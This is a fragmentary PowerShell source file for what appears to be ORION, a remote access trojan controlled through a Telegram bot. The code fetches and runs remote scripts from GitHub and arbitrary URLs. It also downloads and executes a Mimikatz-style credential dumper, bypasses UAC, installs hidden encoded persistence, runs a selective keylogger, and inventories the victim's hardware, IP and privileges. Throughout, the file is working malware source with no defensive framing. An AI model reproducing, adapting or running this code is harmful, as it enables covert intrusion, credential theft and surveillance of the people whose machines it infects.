...
$agent_bot = '[string]$botkey = "your_token";[string]$bot_Master_ID = "your_chat_id";[int]$delay = "your_delay";IEX (Invoke-WebRequest "https://raw.githubusercontent.com/orion0xsec/orion/master/Functions.ps1").content;$chat_id = $bot_Master_ID;$getUpdatesLink = "https://api.telegram.org/bot$botkey/getUpdates";[int]$first_connect = "1";while($true) { $json = Invoke-WebRequest -Uri $getUpdatesLink -Body @{offset=$offset} | ConvertFrom-Json;$l = $json.result.length;$i = 0;if ($first_connect -eq 1) {$texto = "$env:COMPUTERNAME connected with bypassuac :D"; envia-mensaje -text $texto -chat $chat_id -botkey $botkey; $first_connect = $first_connect + 1};while ($i -lt $l) {$offset = $json.result[$i].update_id + 1; $comando = $json.result[$i].message.text;test-command -comando $comando -botkey $botkey -chat_id $chat_id -first_connect $first_connect;$i++} ;Start-Sleep -s $delay ;$first_connect++ }' ; $agent_bot = $agent_bot -replace "your_token", "$botkey" -replace "your_chat_id", "$chat_id" -replace "your_delay", "1" ; return $agent_bot}
...
"Monitor Model" = $MonitorModelo
"Monitor Num. Serie" = $MonitorSerial
"Operating system" = $OSRunning
"Processor" = $name.name
"Manufacturer" = $Manufacturer
"Model" = $Model
"Num. Processors" = "$NoOfProcessors"
"Memory RAM" = "$ram_round Gb"
"Address IP" = [string]$IPAddress[0]
"MAC" = $mac
"Serial number" = $serialnumer
"HDD" = $Disco_duro
}
$PC | select-Object Nombre, "Monitor Model", "Monitor Num. Serie", "Operating system", "Processor", "Manufacturer", "Model", "Num. Processors", "Memory RAM", "HDD", "Address IP", "MAC", "Serial number" 
}
...
$datos_ip_publica = Invoke-WebRequest -Uri http://ifconfig.co/json  | ConvertFrom-Json
 ...
 "country" = $datos_ip_publica.country
 "City" = $datos_ip_publica.city} ; $resultado | Select-Object IP, country, City}
...
{[string]$privilegios = "Unprivileged" }  else {[string]$privilegios = "High Privileges"}; $usuario = $env:USERNAME ; $dominio = $env:USERDOMAIN
$Usuario = "User: $usuario`n" ; $Dominio =  "Domain : $dominio`n" ; $Privilegios = "Privileges : $privilegios`n"; return $usuario, $dominio, $privilegios
 }
...
(wget https://raw.githubusercontent.com/orion0xsec/orion/master/Invoke-MimiGatoz.ps1).content | out-file $ruta_ps1 ; Set-Location $ruta_temp; ./mimigatoz.ps1  | Out-File $ruta ; cat $ruta
...
If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{$texto = "Sorry, you need privileges"; return $texto;break }  else {
$agent_bot = create_agent -botkey $botkey -chat_id $chat_id;  $agent_bot = $agent_bot -replace "with bypassuac :D","" ; $code = code_a_base64 -code $agent_bot; $code = "powershell.exe -win hidden -enc " + $code
...
$texto = "" ; $texto = "Persistence executed correctly"} return $texto;break}



function remove-persistence {
If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{$texto = "Sorry, you need privileges";return $texto; break }  
else {
...
if ($check.count -eq 0) {$texto = "All right! seems to be clean boot"; return $texto; break} else {
$texto = "Removing persistence"
...
if ($i -eq $datos.Count) {$texto = "KeyLogger-Selective Result for your_extrae `n";$extraido = $extraido -replace "<Ctrl><Alt>2", "@"
$texto += $extraido
...
if ($Activar -like "on" ) {$Activar="yes"} ; if ($Activar -like "off") {$Activar="No"} 
...
if ($Activar -eq "yes") { New-ItemProperty -Path $ruta_key -Name $key -Value "1" -PropertyType DWORD -Force| Out-Null; Write-Host "`n`nAdded registry key, restart is required." } 
if ($Activar -eq "No") {Remove-ItemProperty $ruta_key -Name $key  -Force | Out-Null ; "`n`nDeleted registry key, restart is required."}
}


function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect="") 
 $help = "ORION V0.X`n`nComand disponible :`n[*] /Help`n[*] /Info`n[*] /Shell`n[*] /whoami`n[*] /Ippublic`n[*] /Kill`n[*] /Scriptimport`n[*] /Shell nc (NETCAT)`n[*] /Download`n[*] /Screenshot`n[*] /Audio`n[*] /BypassUAC`n[*] /Persistence`n[*] /MimiGatoz`n[*] /KeyLogger_Selective"
 if ($comando -like "/Help") {$texto = $help; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
 if ($comando -like "Hello") {$texto = "Hello ORION !! :D"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id }
 ...
 if ($comando -eq "/Scriptimport") {$texto = "/Scriptimport executing script or powershell command by reading a .txt file from a URL, Meterpreter, Empire...`Example: /scriptimport http://192.168.1.20/meterpreter.txt :D"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
 if ($comando -like "/Scriptimport *") {$comando = $comando -replace "/scriptimport ","" ;$comando = IEX(curl $comando).content ;$texto = "Script Executed from $commando" ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
 ...
 if ($comando -like "/Bypassuac" -and $first_connect -gt 5) {$texto = "Executed BypassUAC, wait for the new BOT connection";envia-mensaje -text $texto -botkey $botkey -chat $chat_id; $id = (Get-Process powershell).Id;$agent_bot = create_agent -botkey $botkey -chat_id $chat_id; BypassUAC-CyberVaca -comando $agent_bot ;  Stop-Process -id $id}
 if ($comando -like "/Persistence") {$texto = "The persistence function is executed: `n /Persistence On`n /Persistence Off"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
 ...
 if ($comando -eq "/KeyLogger_Selective") {$texto = "Activate a KeyLogger selectively.`n Example: /KeyLogger_Selective facebook"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
...
# if ($comando -eq "Mimikittenz") {$texto = "The mimikitenz function is executed: `n /Mimikittenz On`n /Mimikittenz Off"}
